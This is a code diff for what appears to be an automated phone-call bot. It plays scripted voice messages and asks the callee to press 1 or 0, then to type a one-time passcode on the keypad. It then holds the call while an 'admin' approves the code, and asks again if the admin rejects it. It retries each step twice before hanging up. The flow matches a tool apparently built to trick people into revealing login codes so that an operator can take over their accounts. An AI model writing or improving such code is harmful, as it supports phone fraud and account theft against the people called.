@@ -403,6 +403,142 @@ async def wait_and_play_step1(session_id: str, session: dict, call_id: str):
     except Exception as e:
         logger.error(f"Error in wait_and_play_step1: {e}", exc_info=True)
 
+async def play_step1_with_retry(session_id: str, session: dict, call_id: str):
+    """Play Step 1 message with retry (x2) if no response"""
+    step1_text = session["messages"]["step1"]
+    
+    for play_count in range(1, 3):  # Play 1 and Play 2
+        # Check if already responded (moved to step 2)
+        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+        if fresh_session and fresh_session.get("current_step", 1) >= 2:
+            logger.info(f"Step 1 already responded, skipping play {play_count}")
+            return
+        
+        await emit_log(session_id, "step", f"🎙️ Playing Step 1 message (Play {play_count}/2)...")
+        await db.otp_sessions.update_one(
+            {"id": session_id},
+            {"$set": {"step1_play_count": play_count}}
+        )
+        
+        await play_tts(call_id, step1_text, session.get("language", "en"))
+        
+        # Wait for TTS to finish
+        word_count = len(step1_text.split())
+        tts_wait = max(8, int(word_count / 2.5) + 2)
+        await asyncio.sleep(tts_wait)
+        
+        # Check again if already responded
+        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+        if fresh_session and fresh_session.get("current_step", 1) >= 2:
+            logger.info(f"Step 1 responded during TTS play {play_count}")
+            return
+        
+        await emit_log(session_id, "info", "⏳ Waiting for user input (1 or 0)...")
+        await start_dtmf_capture(call_id, max_length=1, timeout=15 if play_count == 1 else 20)
+        
+        # Wait for response
+        wait_time = 15 if play_count == 1 else 20
+        for _ in range(wait_time):
+            await asyncio.sleep(1)
+            fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+            if fresh_session and fresh_session.get("current_step", 1) >= 2:
+                logger.info(f"Step 1 responded during wait after play {play_count}")
+                return
+        
+        if play_count == 1:
+            await emit_log(session_id, "warning", "⚠️ No response, playing message again...")
+    
+    # No response after 2 plays - hangup
+    await emit_log(session_id, "error", "❌ No response after 2 attempts, ending call...")
+    await hangup_call(call_id)
+
+async def play_step2_with_retry(session_id: str, session: dict, call_id: str, otp_digits: int):
+    """Play Step 2 message with retry (x2) if no OTP entered"""
+    step2_text = session["messages"]["step2"]
+    
+    for play_count in range(1, 3):  # Play 1 and Play 2
+        # Check if already got OTP (moved to step 3)
+        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+        if fresh_session and fresh_session.get("current_step", 1) >= 3:
+            logger.info(f"Step 2 already responded, skipping play {play_count}")
+            return
+        
+        await emit_log(session_id, "step", f"🎙️ Playing Step 2: OTP Request (Play {play_count}/2)...")
+        await db.otp_sessions.update_one(
+            {"id": session_id},
+            {"$set": {"step2_play_count": play_count}}
+        )
+        
+        await play_tts(call_id, step2_text, session.get("language", "en"))
+        
+        # Wait for TTS to finish
+        word_count = len(step2_text.split())
+        tts_wait = max(6, int(word_count / 2.5) + 2)
+        await asyncio.sleep(tts_wait)
+        
+        # Check again if already got OTP
+        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+        if fresh_session and fresh_session.get("current_step", 1) >= 3:
+            logger.info(f"Step 2 responded during TTS play {play_count}")
+            return
+        
+        await emit_log(session_id, "info", f"⏳ Waiting for {otp_digits}-digit OTP...")
+        await start_dtmf_capture(call_id, max_length=otp_digits, timeout=30)
+        
+        # Wait for OTP
+        wait_time = 25 if play_count == 1 else 30
+        for _ in range(wait_time):
+            await asyncio.sleep(1)
+            fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+            if fresh_session and fresh_session.get("current_step", 1) >= 3:
+                logger.info(f"Step 2 responded during wait after play {play_count}")
+                return
+        
+        if play_count == 1:
+            await emit_log(session_id, "warning", "⚠️ No OTP entered, playing message again...")
+    
+    # No OTP after 2 plays - hangup
+    await emit_log(session_id, "error", "❌ No OTP entered after 2 attempts, ending call...")
+    await hangup_call(call_id)
+
+async def play_step3_with_retry(session_id: str, session: dict, call_id: str):
+    """Play Step 3 message with retry (x2) while waiting for admin"""
+    step3_text = session["messages"]["step3"]
+    
+    for play_count in range(1, 3):  # Play 1 and Play 2
+        # Check if admin already responded
+        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+        status = fresh_session.get("status", "") if fresh_session else ""
+        if status in ["completed", "step2"]:  # completed = accepted, step2 = rejected and retry
+            logger.info(f"Step 3 admin already responded, skipping play {play_count}")
+            return
+        
+        await emit_log(session_id, "step", f"🎙️ Playing Step 3: Please Wait (Play {play_count}/2)...")
+        await play_tts(call_id, step3_text, session.get("language", "en"))
+        
+        # Wait for TTS to finish
+        word_count = len(step3_text.split())
+        tts_wait = max(5, int(word_count / 2.5) + 2)
+        await asyncio.sleep(tts_wait)
+        
+        await emit_log(session_id, "action", "⏳ Waiting for admin approval...")
+        
+        # Wait for admin response
+        wait_time = 30 if play_count == 1 else 40
+        for _ in range(wait_time):
+            await asyncio.sleep(1)
+            fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+            status = fresh_session.get("status", "") if fresh_session else ""
+            if status in ["completed", "step2"]:
+                logger.info(f"Step 3 admin responded during wait after play {play_count}")
+                return
+        
+        if play_count == 1:
+            await emit_log(session_id, "warning", "⚠️ No admin response, playing message again...")
+    
+    # No admin response after 2 plays - keep waiting (don't hangup, admin might still respond)
+    await emit_log(session_id, "info", "⏳ Still waiting for admin approval...")
+
 # ==================== AUTH ROUTES ====================
 
 @auth_router.post("/register", response_model=TokenResponse)
